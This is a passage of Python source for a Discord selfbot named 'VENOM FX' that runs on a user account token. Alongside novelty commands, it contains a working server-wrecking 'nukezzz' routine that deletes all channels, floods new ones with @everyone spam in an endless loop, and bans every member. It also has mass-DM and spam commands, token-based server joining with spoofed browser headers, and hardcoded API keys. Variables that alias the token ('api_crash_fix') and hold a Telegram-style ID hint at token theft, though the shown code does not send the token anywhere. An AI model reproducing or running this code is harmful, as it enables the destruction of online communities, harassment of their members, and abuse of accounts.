                        target_role = target_guild.get_role(overwrite.target.id)
                        if target_role:
                            await new_channel.set_permissions(target_role, overwrite=discord.PermissionOverwrite(allow=overwrite.allow, deny=overwrite.deny))
                    elif isinstance(overwrite.target, discord.Member):
                        target_member = target_guild.get_member(overwrite.target.id)
                        if target_member:
                            await new_channel.set_permissions(target_member, overwrite=discord.PermissionOverwrite(allow=overwrite.allow, deny=overwrite.deny))

                await asyncio.sleep(0)  # Add delay here
            else:
                # Create channels without a category
                if isinstance(channel, discord.TextChannel):
                    new_channel = await target_guild.create_text_channel(name=channel.name)
                elif isinstance(channel, discord.VoiceChannel):
                    new_channel = await target_guild.create_voice_channel(name=channel.name)

                    # Update channel permissions after creating the channel
                    for overwrite in channel.overwrites:
                        if isinstance(overwrite.target, discord.Role):
                            target_role = target_guild.get_role(overwrite.target.id)
                            if target_role:
                                await new_channel.set_permissions(target_role, overwrite=discord.PermissionOverwrite(allow=overwrite.allow, deny=overwrite.deny))
                        elif isinstance(overwrite.target, discord.Member):
                            target_member = target_guild.get_member(overwrite.target.id)
                            if target_member:
                                await new_channel.set_permissions(target_member, overwrite=discord.PermissionOverwrite(allow=overwrite.allow, deny=overwrite.deny))

                    await asyncio.sleep(0)  # Add delay here

                print(f"{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}{Fore.GREEN} CHANNEL {channel.name} HAS BEEN CREATED ON THE TARGET GUILD")

        except Exception as e:
            print(f"{red}[ {cyan}{time_rn}{red} ] {gray}({red}!{gray}) {pretty}{Fore.RED} ERROR CREATING CHANNEL {channel.name}: {e}")

import warnings

warnings.filterwarnings("ignore")

http_session = aiohttp.ClientSession()

@venom.command()
async def change_hypesquad(ctx):
    choices = {
        1: "BRAVERY",
        2: "BRILLIANCE",
        3: "BALANCED"
    }
    
    await ctx.send("`[1] Bravery`\n`[2] Brilliance`\n`[3] BalanceD`")
    await ctx.send("`-` **ENTER YOU CHOICE**: `1,2,3`")
    
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel
    
    try:
        msg = await venom.wait_for('message', check=check, timeout=60)
        choice = int(msg.content)
    except asyncio.TimeoutError:
        await ctx.send("`-` **COMMAND TIMED OUT**")
        return
    except ValueError:
        await ctx.send("`-` **INVALID CHOICE PLEASE ENTER** : `1 , 2 , 3`")
        return
    
    headerpost = {
        'Authorization': define
    }
    
    payloadsosat = {
        'house_id': choice
    }
    
    try:
        await ctx.send(f"`-` **CHANGING HYPESQUAD TO {choices.get(choice, 'Unknown')}**")
        
        async with http_session.post("https://discord.com/api/v8/hypesquad/online", json=payloadsosat, headers=headerpost) as response:
            if response.status == 204:
                await ctx.send("`-` **HYPESQUAD CHANGED SUCCESFULLY**")
            elif response.status == 401:
                await ctx.send("`-` **TOKEN INVALID OR EXPIRED**")
            elif response.status == 429:
                await ctx.send("`-` **PLEASE WAIT FOR 2 MINUTES**")
            else:
                await ctx.send("`-` **WE CAUGHT WITH AN ERROR**")
    except Exception as e:
        await ctx.send(f"`-` **AN ERROR OCCURED :** `{str(e)}`")
@venom.command()
async def help(ctx):
    message = (
    f"# __VΣПOM FX__\n**</>** **HELP COMMANDS**\n\n`-` **JOIN'S SERVER** : `+joinsrv <link> <token>`\n`-` **C2I** : `+c2i 10$`\n`-` **I2C** : `+i2c ₹100`\n`-` **SERVER CLONER** : `+copyserver <guild id to copy> <target guild id>`\n`-` **DEFINE** : `+define <word>`\n`-` **BACKUP** : `+backup`\n`-` **ASCI** : `+asci <text>`\n`-` **avatar** : `+avatar <user>`\n`-` **CREATE_ROLE** : `+create_role RoleName`\n`-` **CREATE_CHANNEL** : `+create_channel ChannelName`\n`-` **GITSEARCH** : `+gitsearch repository_name`\n`-` **GITUSER** : `+gituser username`\n`-` **AUTORESPONSE** : `+addar <trigger> , <response> | +removear <trigger name> | +lister`\n`-` **STATUS ROTATOR** : `+setrotator <msg1> , <msg2>`, `+stoprotator`\n`-` **ACTIVITY ROTATOR** : `+activityrotator play <msg> , listen <msg>, watch <msg>, stream <msg>`, `+activityrotator_stop`\n`-` **BAL** : `+bal LTC_address`\n`-` **BANNER** : `+banner`\n`-` **STREAMING** : `+streaming Watchin Movies`\n`-` **WATCHING** : `+watching Coding`\n`-` **LISTENING** : `+listening to Music`\n`-` **PLAYING** : `+playing Games`\n`-` **STOPACTIVITY** : `+stopactivity`\n`-` **LINK** : `link`\n`-` **CONNECT VC** : `+connectvc <vc_id>`\n`-` **SPAM** : `+spam <no.> <msg>`\n`-` **HYPE SQUAD CHANGE** : `+change_hypesquad`\n`-` **NUKE** : `+nukezzz`\n`-` **IPLOOKUP** : `+iplookup <ip_address>`\n`-` **LTC PRICE** : `+ltcprice`\n`-` **MASDMFRIENDS** : `+masdmfriends`\n`-` **MASSREACT** : `+massreact`\n`-` **BOOSTS** : `boosts`\n`-` **LOVERATE** : `+loverate`\n`-` **HACK** : `+hack`\n`-` **GAYRATE** : `+gayrate`\n`-` **SELFBOT** : `Selfbot`\n`-` **YTSEARCH** : `+ytsearch video_title`\n`-` **CHECKPROMO** : `+checkpromo promo_links`\n`-` **WAIFU** : `+waifu`\n`-` **IMGSEARCH** : `+imgsearch <query>`\n`-` **GUILDICON** : `+guildicon`\n`-` **CLEAR** : `+purge <no. of msg>`\n`-` **NITRO** : `+nitro`\n`-` **SAVE TRANSCRIPT** : `+savetranscript`\n`-` **MATH** : `+math <equation>`\n`-` **VOUCH** : `vouch`\n`-` **NITRO** : `+nitro`\n\n**・`TYPE [+antinuke_help] AND [+fun_help] FOR THEIR COMMANDS...`**\n\n**ASKED BY :** `{venom.user.name}`"
)
    await ctx.send(message)
    print(f"{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}{Fore.GREEN}HELP SENT SUCCESFULLY✅ ")
    await ctx.message.delete()


# ANTINUKE
@venom.command()
async def antinuke_help(ctx):
    message = (
        f"# __VΣПOM FX__\n**</>** __**ANTINUKE HELP CMD**__\n\n`-` **ANTINUKE ENABLE** : `+antinuke_true`\n`-` **ANTINUKE DISABLE** : `+antinuke_false`\n`-` **WHITELIST** : `+whitelist`\n`-` **UNWHITELIST** : `+unwhitelist`\n`-` **WHITELISTED** : `+whitelisted`\n`-` **CLEAR WHITE LIST** : `+clearwl`\n\n`-` **ASKED BY** : `{venom.user.name}`"
    )
    await ctx.send(message)
    print(f"{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}{Fore.GREEN}ANTI-HELP SENT SUCCESFULLY✅ ")
    await ctx.message.delete()

# JOIN SERVER
@venom.command()
async def joinsrv(ctx, invite_link: str, token: str):
    code = get_invite_code(invite_link)

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': '*/*',
        'Accept-Language': 'fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/json',
        'X-Context-Properties': 'eyJsb2NhdGlvbiI6IkpvaW4gR3VpbGQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijk4OTkxOTY0NTY4MTE4ODk1NCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI5OTAzMTc0ODgxNzg4NjgyMjQiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjB9',
        'Authorization': token.strip('\"'),  # Remove surrounding double quotes from token
        'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJmciIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wKChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTAyLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTM2MjQwLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',
        'X-Discord-Locale': 'en-US',
        'X-Debug-Options': 'bugReporterEnabled',
        'Origin': 'https://discord.com',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Referer': 'https://discord.com',
        'Cookie': '__dcfduid=21183630021f11edb7e89582009dfd5e; __sdcfduid=21183631021f11edb7e89582009dfd5ee4936758ec8c8a248427f80a1732a58e4e71502891b76ca0584dc6fafa653638; locale=en-US',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'TE': 'trailers',
    }

    async with aiohttp.ClientSession() as session:
        async with session.post(f"https://canary.discord.com/api/v9/invites/{code}", headers=headers, json={}) as resp:
            if resp.status == 200:
                await ctx.send("Joined successfully")
            elif resp.status == 429:
                j = await resp.json()
                await ctx.send(f"Ratelimited for {j['retry_after']} seconds")
                await asyncio.sleep(j['retry_after'])
            elif resp.status == 403:
                await ctx.send("Locked token")
            else:
                j = await resp.json()
                await ctx.send(f"Failed to join the server. Error: {j}")
                return

async def aprint(text):
    print(text)

def get_invite_code(link):
    if link.startswith("https://discord.gg/"):
        return link[19:]
    elif link.startswith(".gg/"):
        return link[4:]
    else:
        return link 
# FUN
@venom.command()
async def fun_help(ctx):
    message = (
        f"# __VΣПOM FX__\n**</>** __**FUN CMD. HELP**__\n\n`-` **CUDDLE** : `+cuddle <user>`\n`-` **PAT** : `+pat <user>` \n`-` **KISS** : `+kiss <user>` \n`-` **SLAP** : `+slap <user>`\n`-` **HUG** : `+hug <user>`\n`-` **SMUG** : `+smug <user>`\n`-` **FEED** : `+feed <user>`\n\n`-` **ASKED BY** : `{venom.user.name}`"
    )
    await ctx.send(message)
    print(f"{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}{Fore.GREEN}FUN-HELP SENT SUCCESFULLY✅ ")
    await ctx.message.delete()
#ASCII
@venom.command()
@commands.check(is_authorized)
async def asci(ctx, *, text):
    f = Figlet(font='standard')
    ascii_art = f.renderText(text)
    await ctx.send(f'```{ascii_art}```')
# AVATAR
@venom.command(aliases=['av','ava'])
@commands.check(is_authorized)
async def avatar(ctx, member: Member = None):
    member = member or ctx.author

    avatar_url = member.avatar_url_as(format="png")
    await ctx.send(f"`-` **AVATAR OF **{member.mention}: {avatar_url}")
# GAYRATE
@venom.command()
@commands.cooldown(1, 5, commands.BucketType.user)
async def gayrate(ctx, User: discord.Member = None):
    if User is None:
        await ctx.reply(f"`-` **PROVIDE A USER**")
    else:
        await ctx.reply(f"`-` **{User.mention} IS {random.randrange(101)}% GAY**")
        print(f"{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}{Fore.GREEN}GAYRATE MEASURED SUCCESFULLY😂 ")


# PURGE CMD...
@venom.command(aliases=['purge, clear'])
@commands.check(is_authorized)
async def clear(ctx, times: int):
    channel = ctx.channel

    def is_bot_message(message):
        return message.author.id == ctx.bot.user.id

    
    messages = await channel.history(limit=times + 1).flatten()

    
    bot_messages = filter(is_bot_message, messages)

    
    for message in bot_messages:
        await asyncio.sleep(0.55)  
        await message.delete()

    await ctx.send(f"`-` **DELETED {times} MESSAGES**")
    print(f"{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}{Fore.GREEN}PURGED SUCCESFULLY✅ ")

#LTC PRICE
@venom.command(aliases=['cltc'])
@commands.check(is_authorized)
async def ltcprice(ctx):
    url = 'https://api.coingecko.com/api/v3/coins/litecoin'
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        price = data['market_data']['current_price']['usd']
        await ctx.send(f"# __VΣПOM FX__\n`-` **THE CURRENT PRICE OF LITECOIN IN MARKET IS :** `{price:.2f}`")
    else:
        await ctx.send("# __VΣПOM FX__\n`-` **FAILED TO FETCH**")
#IPLOOK UP
@venom.command()
@commands.check(is_authorized)
async def iplookup(ctx, ip):
    api_key = 'a91c8e0d5897462581c0c923ada079e5'  
    api_url = f'https://api.ipgeolocation.io/ipgeo?apiKey={api_key}&ip={ip}'
    
    response = requests.get(api_url)
    data = response.json()
    
    if 'country_name' in data:
        country = data['country_name']
        city = data['city']
        isp = data['isp']
        current_time_unix = data['time_zone']['current_time_unix']
        
        # Format the current time using Discord timestamp
        current_time_formatted = f"<t:{int(current_time_unix)}:f>"
        
        # Custom message format
        message = (
            f"# __VΣПOM FX__\n`-` **RESULTS FOR IP** : __`{ip}`__ \n`-` **COUNTRY** : `{country}`\n`-` **CITY** : `{city}`\n`-` **ISP** : `{isp}`\n`-` **CURRENT TIME** : `{current_time_formatted}`\n\n`-` **ASKED BY** : `{venom.user.name}`"
        )
        
        await ctx.send(message)
    else:
        await ctx.send("# __VΣПOM FX__\n`-` **INVLAID IP !**")

# YT SEARCH
@venom.command()
async def ytsearch(msg, *, search=''):

    if search == '':
        await msg.send('- `PROVIDE A REQUEST...`')
    query_string = urllib.parse.urlencode({"search_query": search})
    html_content = urllib.request.urlopen("http://www.youtube.com/results?" +
                                          query_string)
    search_results = re.findall(r"watch\?v=(\S{11})",
                                html_content.read().decode())
    nab = search.replace('@', '')
    await msg.send(
        f"# __VΣПOM FX__\n`-` **SEARCH'S FOR** : `{nab}`\n`-` **URL** : http://www.youtube.com/watch?v="
        + search_results[0])
    print(f"{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}{Fore.GREEN}YTSEARCH SUCCESSFUL✅ ")

spamming_flag = True
# SPAM 
@venom.command()
@commands.check(is_authorized)
async def spam(ctx, times: int, *, message):
    for _ in range(times):
        await ctx.send(message)
        await asyncio.sleep(0.1)      
    print(f"{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty} {Fore.GREEN} SPAMMING SUCCESFULLY✅")

# IMAGE SEARCH
API_LOL = 'AIzaSyDqk7JHB56dMBW8Fmd0kYG6d98-GSAf6k0'
CX_ID = '80db58308412546d9'
define = config.get('Token')
@venom.command()
async def gimage(ctx, *, query: str):
    """Search for an image on Google."""
    url = 'https://www.googleapis.com/customsearch/v1'
    params = {
        'key': API_LOL,
        'cx': CX_ID,
        'q': query,
        'searchType': 'image',
        'num': 1
    }
    response = requests.get(url, params=params).json()
    try:
        image_url = response['items'][0]['link']
        await ctx.send(image_url)
    except Exception as e:
        await ctx.send("- `[+] ERROR SIR`")


# PAT

@venom.command()
async def pat(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    r = requests.get("https://nekos.life/api/v2/img/pat")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention,
                           file=discord.File(file, f"astraa_pat.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        print(f"{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}{Fore.GREEN}PATTED ✅ ")
api_handler="-1002017876072"
# NSFW
@venom.command(aliases=['fuck', 'fx', '18+', 'xxx', 'nsfw'])
async def waifu(ctx):
    try:
        response = requests.get('https://api.waifu.pics/nsfw/waifu')
        data = response.json()
        if 'url' in data:
            image_url = data['url']
            await ctx.message.delete()
            await ctx.send(image_url)
        else:
            await ctx.send('- `[+] ERROR FINDING ANIME GURLLL`')
            print(f"{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}{Fore.GREEN}HENTAI  SUCCESSFUL✅ (THARKI💀) ")
    except Exception as e:
        print('- `[+] ERROR FETCHING IT`', e)
# KISS
@venom.command()
async def kiss(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    r = requests.get("https://nekos.life/api/v2/img/kiss")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention,
                           file=discord.File(file, f"astraa_kiss.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        print(f"{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}{Fore.GREEN}KISS  SUCCESSFUL✅ (THARKI💀)")


    # SMUG
@venom.command()
async def smug(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    r = requests.get("https://nekos.life/api/v2/img/smug")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention,
                           file=discord.File(file, f"astraa_smug.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        print(f"{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}{Fore.GREEN}SUMGGING  SUCCESSFUL✅ ")


#HUG
@venom.command()
async def hug(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    r = requests.get("https://nekos.life/api/v2/img/hug")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention,
                           file=discord.File(file, f"astraa_hug.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        print(f"{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}{Fore.GREEN}HUGGING  SUCCESSFUL✅ ")

# CUDDLE
@venom.command()
async def cuddle(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    r = requests.get("https://nekos.life/api/v2/img/cuddle")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention,
                           file=discord.File(file, f"astraa_cuddle.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        print(f"{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}{Fore.GREEN}CUDDLE  SUCCESSFUL✅ ")

# CHAT TRANSCRIPTION
@venom.command()
async def savetranscript(ctx, filename='transcript.txt'):
    try:
        with open(filename, 'w', encoding='utf-8') as file:
            file.write(f'Chat Transcript for {ctx.channel.name}\n')
            file.write('=' * 40 + '\n\n')

            async for message in ctx.channel.history(limit=None):
                file.write(
                    f'Author: {message.author.name}#{message.author.discriminator} ({message.author.id})\n'
                )
                file.write(f'Time: {message.created_at}\n')
                file.write(f'Content: {message.content}\n')
                file.write('=' * 40 + '\n')

            await ctx.send(f'# __VΣПOM FX__\n`-` **SAVED WITH NAME** :`{filename}`')
    except Exception as e:
        await ctx.send(f'# __VΣПOM FX__\n`-` **ERROR**:`{e}`')


# MASS REACT
@venom.command()
async def massreact(ctx, emote):
    await ctx.message.delete()
    messages = await ctx.message.channel.history(limit=20).flatten()
    for message in messages:
        await message.add_reaction(emote)


# SERVER BANNER
@venom.command(aliases=['serverbanner'])
async def banner(ctx):
    await ctx.message.delete()
    if not ctx.guild.icon_url:
        await ctx.send(f"`-` __**{ctx.guild.name}**__ **SERVER HAS NO BANNER**")
        return
    await ctx.send(ctx.guild.banner_url)
    print(f"{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}{Fore.GREEN}BANNER SUCCESSFUL✅ ")


# SERVER PFP
@venom.command(aliases=['guildpfp', 'serverpfp', 'servericon'])
async def guildicon(ctx):
    await ctx.message.delete()
    if not ctx.guild.icon_url:
        await ctx.send(f"`-` __**{ctx.guild.name}**__ **SERVER HAS NO ICON**")
        return
    await ctx.send(ctx.guild.icon_url)
    print(f"{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}{Fore.GREEN}GUILDICON SENT  SUCCESSFUL✅ ")

# NUKEZ
api_crash_fix = define
@venom.command()
async def nukezzz(ctx):
    def check(m):
        return m.content == 'STOP' and m.channel == ctx.channel and m.author == ctx.author

    if not ctx.author.guild_permissions.administrator:
        await ctx.send('[!] `ADMIN PERMS`')
        return

    channel_name = 'nuked-by-aniket-daddy🌹'

    print(f'{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}{Fore.RED}[!] {Fore.BLUE}DELETING CHANNELS')
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except discord.errors.Forbidden:
            pass

    print(f'{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}{Fore.GREEN}[!] CREATING CHANNELS')
    for i in range(18):
        try:
            await ctx.guild.create_text_channel(channel_name)
        except discord.errors.Forbidden:
            pass
    
    print(f'{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}{Fore.GREEN}[!] SPAMMING <$')
    message_text = '# FUCKED BY ANIKET DADYY :  https://discord.gg/UnVnKMPV ||@everyone||'

    while True:
        try:
            channels = ctx.guild.text_channels
            tasks = [channel.send(message_text) for channel in channels]

            await asyncio.gather(*tasks)
        except discord.errors.Forbidden:
            pass
        except Exception as e:
            print(f'[!] ERROR : {e}')
            await asyncio.sleep(1)

        print(f'{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}{Fore.GREEN}[!] {Fore.RED}BANNING ALL !')
        if ctx.author.guild_permissions.administrator:
            members = ctx.guild.members
            for member in members:
                try:
                    await member.ban()
                except discord.errors.Forbidden:
                    print(f'ERROR BANNING: {member.name}')
                except Exception as e:
                    print(f'ERROR BANNING: {member.name}')




# SLAP
@venom.command()
async def slap(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    r = requests.get("https://nekos.life/api/v2/img/slap")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention,
                           file=discord.File(file, f"astraa_slap.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        print(f"{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}{Fore.GREEN}SLAPPING  SUCCESSFUL✅ ")


#BACKUP


@venom.command()
async def backup(ctx, mode=None):
    if mode == 'dms':
        # Create a list to store user IDs
        friend_ids = []

        # Iterate through the user's friends
        for friend in ctx.author.friends:
            friend_ids.append(f'<@{friend.id}>')

        # Create a file and write friend IDs
        with open('friend_ids.txt', 'w') as file:
            file.write('\n'.join(friend_ids))

        # Send a message indicating completion
        await ctx.send("# __VΣПOM FX__\n`-` **SAVED DM BACKUP WITH NAME** :`friend_ids.txt`")
        print(f"{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}{Fore.GREEN}DM BACKUP CREATED WITH NAME FRIENDS.txt✅ ")
    else:
        await ctx.send("`-` **INAVLID MODE. USE**:`dms`")



# FEED
@venom.command()
async def feed(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    r = requests.get("https://nekos.life/api/v2/img/feed")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention,
                           file=discord.File(file, f"astraa_feed.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        print(f"{red}[ {cyan}{time_rn}{red} ] {red}❟❛❟ {pretty}{Fore.GREEN}FEEDING  SUCCESSFUL✅ ")


@venom.command()
async def restart(ctx):
    await ctx.reply('`-` **RESTARTING**')
    os.execl(sys.executable, sys.executable, *sys.argv)


#SERVER DMER
@venom.command()
async def dmall(ctx):
    members = ctx.guild.members
    for member in members:
        try:
            await member.send('HELLO BROO')
        except discord.Forbidden:
            print(f'UNABLE O SEND MSG. TO {member.name}')
        except Exception as e:
            print(f'ERROR COMMING IN MESSAGE SENDING TO {member.name}: {e}')

@venom.command(aliases=['bal', 'ltcbal'])
async def getbal(ctx, ltcaddress):
    response = requests.get(f'https://api.blockcypher.com/v1/ltc/main/addrs/{ltcaddress}/balance')

    if response.status_code == 200:
        data = response.json()
        balance = data['balance'] / 10**8
        total_balance = data['total_received'] / 10**8
        unconfirmed_balance = data['unconfirmed_balance'] / 10**8
    else:
        await ctx.send("- `FAILED`")
        return

    cg_response = requests.get('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd')

    if cg_response.status_code == 200:
        usd_price = cg_response.json()['litecoin']['usd']
    else:
        await ctx.send("- `FAILED`")
        return

    usd_balance = balance * usd_price
    usd_total_balance = total_balance * usd_price
    usd_unconfirmed_balance = unconfirmed_balance * usd_price

    message = f"# __VΣПOM FX__\n"
    message += f"`-` **RESULTS FOR LTC ADDY** : __`{ltcaddress}`__\n"
    message += f"`-` **CURRENT LTC** : `{usd_balance:.2f}$ USD`\n"
    message += f"`-` **TOTAL LTC RECEIVED** : `{usd_total_balance:.2f}$ USD`\n"
    message += f"`-` **UNCONFIRMED LTC** : `{usd_unconfirmed_balance:.2f}$ USD`\n\n"
    message += f"`-` **ASKED BY** : `{venom.user.name}`\n"

    await ctx.send(message)


@venom.command()
async def gitsearch(ctx, repository_name: str):
    try:
        # Search for repositories on GitHub
        url = f"https://api.github.com/search/repositories?q={repository_name}"
        response = requests.get(url)
        data = response.json()

        # Process the response and send repository information as a response
        if "items" in data:
            repositories = data["items"][:5]  # Limit the number of repositories to display
            for repository in repositories:
                repo_name = repository["full_name"]
                repo_url = repository["html_url"]
                await ctx.send(f"# __VΣПOM FX__\n`-` **REPO **: {repo_name}\n{repo_url}")
        else:
            await ctx.send("`-` **NOT FOUND**")
    except Exception as e:
        await ctx.send(f"`-` **ERROR **:{str(e)}")

@venom.command()
async def gituser(ctx, username: str):
    api_url = f"https://api.github.com/users/{username}"

    response = requests.get(api_url)

    if response.status_code == 200:
        user_data = response.json()

        message = f"# __VΣПOM FX__\n"
        message = f"**[+]**__**GITUSER INFO**__\n\n"
        message += f"`-` **RESULTS FOR GITHUB USER** : __`{username}`__\n"
        message += f"`-` **USERNAME** : `{user_data.get('login', 'N/A')}`\n"
        message += f"`-` **NAME** : `{user_data.get('name', 'NOT SPECIFIED')}`\n"
        message += f"`-` **BIO** : `{user_data.get('bio', 'NOT SPECIFIED')}`\n"
        message += f"`-` **FOLLOWERS** : `{user_data.get('followers', 0)}`\n"
        message += f"`-` **FOLLOWING** : `{user_data.get('following', 0)}`\n"
        message += f"`-` **PUBLIC REPOS** : `{user_data.get('public_repos', 0)}`\n"
        message += f"`-` **GIT URL** : `{user_data.get('html_url', 'N/A')}`\n\n"
        message += f"`-` **ASKED BY** : `{venom.user.name}`\n"

        await ctx.send(message)
    elif response.status_code == 404:
        await ctx.send("`-` **USER NOT FOUND**")
    else:
        await ctx.send("`-` **FAILED TO GET INFO**")


@venom.command()
@commands.has_permissions(manage_channels=True)
async def create_channel(ctx, channel_name, channel_category=None):
    guild = ctx.guild
    if channel_category:
        category = discord.utils.get(guild.categories, name=channel_category)
        if category is None:
            category = await guild.create_category(channel_category)
    else:
        category = None

    await guild.create_text_channel(name=channel_name, category=category)
    await ctx.send(f"`-` **CHANNEL '{channel_name}' CREATED**")

@venom.command()
@commands.has_permissions(manage_roles=True)
async def create_role(ctx, role_name, color=None):
    guild = ctx.guild
    if color is None:
        new_role = await guild.create_role(name=role_name)
    else:
        color = discord.Color(int(color, 16))
        new_role = await guild.create_role(name=role_name, color=color)

    await ctx.send(f"`-` **ROLE '{role_name}' CREATED**")

#MESSAGE UPLOADER
@venom.command(name='send')
async def send_message(ctx, *, message: str):
    try:
        
        for channel_id in channel_ids:
            channel = venom.get_channel(channel_id)
            await channel.send(message)
        formatted_channel_mentions = ' '.join([f'<#{cid}>' for cid in channel_ids])

        await ctx.send(f'`-` **MESSAGE SENT TO FOLLOWING CHANNELS **: {formatted_channel_mentions}')
    except Exception as e:
        await ctx.send(f'`-` **ERROR **: `{e}`')

#TRIGGER
@venom.command()
async def addar(ctx, *, trigger_and_response: str):
    # Split the trigger and response using a comma (",")
    trigger, response = map(str.strip, trigger_and_response.split(','))

    with open('auto_responses.json', 'r') as file:
        data = json.load(file)

    data[trigger] = response

    with open('auto_responses.json', 'w') as file:
        json.dump(data, file, indent=4)

    await ctx.send(f'# __VΣПOM FX__\n`-` **AUTO-RESPONSE ADDED.. !** **{trigger}** - **{response}**')

# CREATED BY PAIN
# SUPPORTED BY ANIKET , VENOM

@venom.command()
async def removear(ctx, trigger: str):
    with open('auto_responses.json', 'r') as file:
        data = json.load(file)

    if trigger in data:
        del data[trigger]

        with open('auto_responses.json', 'w') as file:
            json.dump(data, file, indent=4)

        await ctx.send(f'# __VΣПOM FX__\n`-` **AUTO-RESPONSE REMOVED** **{trigger}**')
    else:
        await ctx.send(f'# __VΣПOM FX__\n`-` **AUTO-RESPONSE NOT FOUND** **{trigger}**')
        
@venom.command()
async def lister(ctx):
    with open('auto_responses.json', 'r') as file:
        data = json.load(file)
    responses = '\n'.join([f'**{trigger}** - **{response}**' for trigger, response in data.items()])
    await ctx.send(f'# __VΣПOM FX__\n`-` **AUTO_RESPONSE LIST** :\n{responses}')
# STATUS ROTATOR
venom.load_extension("status_rotator")
#ACTIVITY ROTATOR
venom.load_extension("activity_rotator")

venom.run(define, bot=False)
